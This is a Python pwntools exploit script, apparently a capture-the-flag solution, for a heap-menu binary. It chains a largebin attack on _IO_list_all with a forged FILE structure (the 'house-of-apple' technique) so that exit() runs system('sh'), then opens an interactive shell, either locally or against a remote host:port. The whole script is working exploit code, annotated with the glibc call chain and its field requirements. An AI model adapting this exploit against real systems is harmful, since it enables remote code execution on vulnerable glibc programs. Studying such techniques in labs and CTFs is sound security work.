from pwn import *
context(os='linux', arch='i386', kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']
fname = args.FNAME if args.FNAME else './vuln'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        log.info('PID: %d' % io.proc.pid)
    pause()

s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'>', str(idx).encode())

def add(idx, sz):
    opt(1)
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())
    

def edit(idx, content):
    opt(3)
    sla(b'Index: ', str(idx).encode())
    sa(b'Content: ', content)

def show(idx):
    opt(4)
    sla(b'Index: ', str(idx).encode())

def delete(idx):
    opt(2)
    sla(b'Index: ', str(idx).encode())

def exp():
    add(0, 0x500)
    add(1, 0x500)
    add(2, 0x510)
    add(3, 0x510)
    delete(2)
    add(4, 0x800)
    show(2)
    fd = u64(rl()[:-1].ljust(8, b'\x00'))
    log.success(f'largebin@{hex(fd)}')

    libc.address = fd - 0x490 - 0x1e3ba0
    log.success(f'libc@{hex(libc.address)}')

    fake_nxtsz = libc.sym._IO_list_all - 0x20
    edit(2, flat([fd, fd, fake_nxtsz, fake_nxtsz]))
    
    delete(0)
    add(5, 0x800) # trigger largebin attack

    show(2) # leak heap
    chk0_addr = u64(rl()[:-1].ljust(8, b'\x00'))
    heap_base = chk0_addr - 0x290
    log.success(f'heap_base: {hex(heap_base)}')

    # house-of-apple
    fake_FILE_addr = chk0_addr + 0x520
    _wide_data = fake_FILE_addr + 0x8
    _wide_vtable = _wide_data + 0xe8 - 0x68

    # Calling chain: 
    # exit()
    #  |-- _IO_flush_all_lockp()
    #       |-- _IO_OVERFLOW(fp) ==> _IO_wfile_jumps.__overflow()
    #           |-- _IO_wdoallocbuf(fp) ==> fp->_wide_data->_wide_table->__doallocate
    # Requirements:
    #   _flags &= ~(2|8|0x800)
    #   mode > 0
    #   _wide_data->_IO_write_base = 0
    #   _wide_data->_IO_write_ptr > _wide_data->_IO_write_base
    #   _wide_data->_IO_buf_base = 0
    #   fp->_vtable_offset = 0
    fake_FILE = flat([
        b'  sh'.ljust(8, b'\0'), # _flags &= ~(2|8|0x800), u64(b'  sh')==0x68732020
        0, 0, 0, # _IO_read_ptr, _IO_read_end, _IO_read_base
        0, # _IO_write_base
        1, # RDX = _IO_write_ptr,
        2, # _IO_write_end
        [0] * 6, 
        0, # +0x68, _chain
        [0] * 6, 
        _wide_data, # +0xa0: _wide_data = fake_FILE+8
        [0] * 3, 
        1, # +0xc0: _mode
        [0] * 2, 
        libc.sym._IO_wfile_jumps, # +0xd8: RAX = _vtable
        # fake_FILE end, but fake_IO_wide_data still have some members.
        0,
        _wide_vtable,   # +0xe8 == fake_wide_data + 0xe0, _wide_vtable
        libc.sym.system,     # +0xf0 == fake_wide_data + 0xe8, _wide_vtable->__overflow
    ])

    edit(0, b'\0'*0x58 + p64(fake_FILE_addr)) # set _IO_list_all->_chain
    edit(1, fake_FILE)

    bpt()

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()